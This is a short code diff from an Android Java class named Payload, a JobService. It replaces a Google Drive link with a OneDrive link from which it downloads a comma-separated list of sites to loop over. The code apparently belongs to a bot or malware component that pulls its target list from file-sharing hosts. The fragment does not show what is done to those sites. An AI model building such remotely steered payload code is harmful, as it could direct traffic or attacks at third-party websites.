@@ -119,7 +119,8 @@ public class Payload extends JobService {
         sites.add("paner.altervista.org");
         try {
             //result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF");
-            result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny");
+            //result = getResponseFromUrl("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny");
+            result = getResponseFromUrl("https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt");
             String[] myarray = result.split(",", -1);
             for (String site : myarray) {
 
